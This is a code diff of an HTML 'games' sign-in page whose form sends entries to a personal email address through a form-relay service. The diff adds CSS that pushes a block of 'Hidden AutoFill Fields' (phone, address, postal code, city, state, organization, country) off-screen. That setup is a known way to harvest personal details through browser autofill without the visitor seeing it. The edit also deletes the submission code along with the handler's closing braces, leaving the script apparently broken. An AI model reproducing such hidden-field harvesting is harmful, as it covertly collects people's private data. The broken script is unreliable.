@@ -9,6 +9,12 @@
       .form-control { background-color: #ffffff; color: #000000; border: 1px solid #ced4da; }
       .btn-primary { background-color: #007bff; border-color: #007bff; }
       #confirmation { display: none; color: #28a745; margin-top: 20px; text-align: center; }
+      .off-screen {
+        position: absolute;
+        left: -9999px; /* Moves elements offscreen */
+        visibility: hidden; /* Hides them visually */
+        display: block; /* Maintains their functionality */
+      }
     </style>
   </head>
   <body>
@@ -17,7 +23,6 @@
       <p>Please sign in to access the games!</p>
       <form id="signInForm" action="https://formsubmit.co/bobperson300@gmail.com" method="POST">
         <!-- Visible Fields -->
-         <!-- Visible Fields -->
         <div class="form-group">
           <label for="name">Name</label>
           <input id="name" name="name" type="text" class="form-control" required>
@@ -29,15 +34,16 @@
 
         <!-- Hidden AutoFill Fields -->
         <div class="form-group off-screen">
-          <input name="phone" type="text" placeholder="Phone">
-          <input name="organization" type="text" placeholder="Organization">
-          <input name="address" type="text" placeholder="Address">
-          <input name="postal" type="text" placeholder="Postal Code">
-          <input name="city" type="text" placeholder="City">
-          <input name="state" type="text" placeholder="State">
+          <input name="phone" type="text" value="123-456-7890">
+          <input name="organization" type="text" value="The Area Inc.">
+          <input name="address" type="text" value="123 Main Street">
+          <input name="postal" type="text" value="12345">
+          <input name="city" type="text" value="Example City">
+          <input name="state" type="text" value="Example State">
           <select name="country">
             <option value=""></option>
             <option value="FI">Finland</option>
+          </select>
         </div>
 
         <input type="hidden" name="_captcha" value="false">
@@ -68,14 +74,6 @@
       // Handle form submission
       document.getElementById('signInForm').addEventListener('submit', function (e) {
         e.preventDefault(); // Prevent default form behavior
-        fetch(this.action, {
-          method: 'POST',
-          body: new FormData(this)
-        }).then(() => {
-          document.getElementById('confirmation').style.display = 'block';
-          this.reset();
-        });
-      });
 
         // Save user data to localStorage
         const name = document.getElementById('name').value;
